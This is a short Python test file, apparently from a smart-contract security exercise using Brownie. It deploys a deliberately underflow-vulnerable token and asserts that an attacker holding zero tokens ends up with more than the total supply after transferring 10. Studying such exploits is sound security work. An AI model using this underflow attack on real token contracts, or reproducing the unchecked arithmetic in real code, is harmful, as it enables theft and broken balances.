from brownie import reverts, accounts

from scripts.deploy import deploy_token_underflow


def test_token_attack():
    ## Arrange
    token_contract = deploy_token_underflow(1000000000)
    attacker = accounts[2]
    # Initial assertions
    assert token_contract.totalSupply() == 1000000000
    assert token_contract.balanceOf(attacker.address) == 0
    # Act
    token_contract.transfer(accounts[1].address, 10, {"from": attacker})
    # Assert
    assert token_contract.balanceOf(accounts[1].address) == 10
    assert token_contract.balanceOf(attacker.address) > 1000000000
